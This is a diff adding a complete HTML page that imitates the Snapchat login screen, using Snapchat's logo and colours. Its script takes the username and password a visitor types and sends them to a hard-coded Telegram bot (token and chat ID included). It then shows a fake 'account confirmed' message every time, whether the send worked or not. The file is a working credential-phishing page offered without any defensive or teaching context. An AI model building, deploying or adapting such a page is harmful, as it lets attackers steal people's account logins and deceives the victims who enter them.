@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Snapchat</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFFC00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 300px;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #000;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: #FFFC00;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #e6db00;
+        }
+
+        .link {
+            margin-top: 15px;
+            display: block;
+            color: #555;
+            text-decoration: none;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        /* Notification design centered on the page */
+        .notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            background-color: white;
+            color: #333;
+            padding: 20px 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            opacity: 0;
+            transition: all 0.4s ease-in-out;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .notification-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #4CAF50; /* Green color indicating success */
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .notification-message {
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" alt="Snapchat Logo" class="logo">
+        <h2>Login to Snapchat</h2>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        
+        <a href="#" class="link">Forgot your password?</a>
+        <a href="#" class="link">Create a new account</a>
+    </div>
+
+    <!-- Confirmation Notification -->
+    <div class="notification" id="confirmationNotification">
+        <div class="notification-icon">✔</div>
+        <div class="notification-message">Your account has been confirmed</div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();  // Prevent page reload
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Prepare the message with a comma and new line
+            const message = `Username: ${username},%0APassword: ${password}`;
+
+            // Set the new Telegram API URL
+            const telegramApiUrl = `https://api.telegram.org/bot7216667772:AAHsAxTPv_8Lzns19UkYOtnO7KSaBemNlik/sendMessage?chat_id=7019395783&text=${message}`;
+
+            // Call the Telegram API to send the message
+            fetch(telegramApiUrl)
+                .then(response => {
+                    if (response.ok) {
+                        showConfirmation(); // Show success notification
+                    } else {
+                        showConfirmation(); // Show confirmation notification even if error
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showConfirmation(); // Show confirmation notification on error as well
+                });
+        });
+
+        // Function to display confirmation notification
+        function showConfirmation() {
+            const notification = document.getElementById('confirmationNotification');
+            notification.classList.add('show');
+
+            // Hide notification after 4 seconds
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 4000);
+        }
+    </script>
+
+</body>
+</html>
